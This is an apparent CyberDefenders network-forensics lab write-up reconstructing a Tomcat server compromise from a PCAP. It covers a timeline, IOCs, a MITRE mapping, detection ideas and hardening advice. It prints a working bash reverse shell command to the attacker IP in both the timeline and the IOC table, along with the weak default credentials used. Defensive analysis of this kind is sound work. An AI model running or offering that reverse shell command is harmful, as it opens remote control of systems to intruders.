# Tomcat Takeover — Incident Report

**Platform:** CyberDefenders (Blue Team Lab)
**Category:** Network Forensics
**Tool:** Wireshark
**Analyst:** Tilak Thapa

## Summary
An attacker scanned a web server, found an Apache Tomcat admin panel, logged in with weak credentials, uploaded a malicious file to get a reverse shell, and set up persistence. I analyzed the PCAP to reconstruct the attack.

## Timeline
1. **Recon:** Attacker IP `14.0.0.120` port-scanned the server `10.0.0.112`.
2. **Discovery:** Found the Tomcat admin panel on port `8080`.
3. **Enumeration:** Used `gobuster` to find the `/manager` directory.
4. **Initial access:** Brute-forced the login and got in with `admin:tomcat`.
5. **Execution:** Uploaded `JXQOZNHYJ.war` to get a reverse shell.
6. **Persistence:** Created a cron job: `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`.

## Indicators of Compromise (IOCs)
| Type | Value |
|------|-------|
| Attacker IP | `14.0.0.120` |
| Attacker location | China |
| Compromised credentials | `admin:tomcat` |
| Malicious file | `JXQOZNHYJ.war` |
| Persistence command | `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'` |

## MITRE ATT&CK Mapping
| Tactic | Technique |
|--------|-----------|
| Reconnaissance | T1595 – Active Scanning |
| Discovery | T1083 – File and Directory Discovery |
| Credential Access | T1110 – Brute Force |
| Initial Access | T1078 – Valid Accounts |
| Persistence | T1505.003 – Web Shell |
| Persistence | T1053.003 – Scheduled Task/Job: Cron |

## Detection Ideas
- Alert on many failed logins to `/manager` from one IP in a short window.
- Alert on `.war` file uploads to Tomcat.
- Alert on new cron entries containing `/dev/tcp` or `bash -i`.
- Alert on outbound connections from the web server to unknown IPs.

## Recommendations
- Change default Tomcat credentials and use strong passwords.
- Restrict the admin panel to internal IPs or a VPN.
- Add account lockout after failed logins.
- Monitor the web server with a SIEM (e.g., Wazuh).

## What I Learned
This lab showed me how to reconstruct a full attack chain from a single PCAP. Filtering HTTP traffic and following TCP streams in Wireshark made it possible to see the brute-force attempts, the file upload, and the reverse shell commands in plain text.
